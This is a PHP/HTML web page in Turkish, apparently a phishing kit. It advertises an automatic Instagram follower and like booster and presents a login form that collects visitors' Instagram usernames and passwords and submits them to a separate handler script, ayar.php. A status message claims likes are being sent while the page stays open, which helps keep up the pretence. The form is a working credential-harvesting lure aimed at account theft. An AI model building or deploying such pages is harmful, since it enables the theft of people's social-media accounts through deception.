<?
if (isset($_GET["link"])) { $gonder = "Beğeniler Gönderilmeye Başlanmıştır.Sayfa Açık Kaldığı Sürece Gönderecektir...";  }
?>
<!DOCTYPE HTML>
<!--
	Tessellate by HTML5 UP
	html5up.net | @ajlkn
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
	<head>
		<title>İnstagram Takipçi Hilesi</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
		<link rel="stylesheet" href="assets/css/main.css" />
		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
		<!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
	</head>
	<body>

		<!-- Header -->
			<section id="header" class="dark">
				<header>
					<h1>İnstagram Otomatik Takipçi Arttırma !</h1>
					<center><? echo $gonder; ?></center>
<form method="POST" id="button" class="adjacent" action="ayar.php">
    <table id="credentials_table">
    <tr>
        <td colspan=2 id="testcredentials_table_header" height="52" ><img src="" /></td>
    </tr>
    <tr>
        <td colspan=2 id="testcredentials_table_postheader" height="20"></td>
    </tr>
    <tr>
        <td colspan=2 class="credentials_table_unified_cell" ><label for="text">Kullanıcı Adı:</label><input type=text name=username class="credentials_input_text"  value="" id="input_1" autocomplete="off" autocapitalize="off"></td>
    </tr>
    <tr>
        <td colspan=2 class="credentials_table_unified_cell" ><label for="password">Şifre:</label><input type=password name=password class="credentials_input_password"  value="" id="input_2" autocomplete="off" autocapitalize="off"></td>
    </tr>
    <h1><tr id="submit_row">
        <td id="main_table_input_image_cell" class="credentials_table_unified_cell"><input type="image" border="0" src="http://betyapdedikodu.com/wp-content/uploads/2013/06/SITEYE-GIRIS-BUTTON1.png" alt="Login" >
        </td>
    </tr></h1>
    <tr>
        <td colspan=2 id="credentials_table_footer" ></td>
    </tr>
    </table>
    <input type=hidden name="vhost" value="standard">
    </form>

        </div>

</div>

    </div>
</div>
				</header>
				
			</section>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.scrolly.min.js"></script>
			<script src="assets/js/skel.min.js"></script>
			<script src="assets/js/util.js"></script>
			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
			<script src="assets/js/main.js"></script>

	</body>
</html>
<? if (isset($_GET["link"])) { include "ayar.php";  } ?>